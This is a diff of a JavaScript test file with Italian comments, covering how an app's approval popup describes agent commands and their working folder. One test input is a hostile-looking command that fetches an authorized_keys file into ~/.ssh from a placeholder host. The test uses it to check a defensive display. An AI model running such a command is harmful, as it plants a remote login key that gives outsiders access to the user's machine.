@@ -206,7 +206,7 @@ test('#479 — describe dice anche DOVE il comando agisce (cartella di lavoro)',
   // main come `_cwd` (già abbreviata), mai l'LLM.
   const d = AL.describe({ type: 'ESEGUI_COMANDO', comando: 'wget http://x/authorized_keys', _cwd: '~/.ssh' });
   assert.match(d, /wget http:\/\/x\/authorized_keys/);
-  assert.match(d, /Cartella di lavoro: ~\/\.ssh/);
+  assert.match(d, /Cartella di lavoro:\n~\/\.ssh/);
   // Senza `_cwd` (nessuna cartella nota) il testo resta quello di prima.
   const senza = AL.describe({ type: 'ESEGUI_COMANDO', comando: 'ls' });
   assert.ok(!/Cartella di lavoro/.test(senza));
@@ -338,12 +338,7 @@ function sondeScoperte(type) {
 
 test('#592.7 — ogni campo che il popup mostra, letto da describe, sta in un riquadro se non è di Filo', () => {
   for (const type of Object.keys(AL.REGISTRY)) {
-    const { sonde, letti } = sondeScoperte(type);
-    for (const k of letti) {
-      if (k.startsWith('_') && !(k in SCRITTI_DA_FILO) && !(k in OGGETTI_DEL_MAIN) && !ELENCHI.has(k)) {
-        // Un campo del main può portare testo di altri (un titolo, un nome): sondato come testo, va bene lo stesso.
-      }
-    }
+    const { sonde } = sondeScoperte(type);
     for (const a of sonde) {
       const filo = paroleDiFilo(AL.describeParts(a));
       assert.ok(!filo.includes(SEGNO), `${type}: un campo letto da describe finisce fra le parole di Filo: ${filo.slice(0, 120)}`);
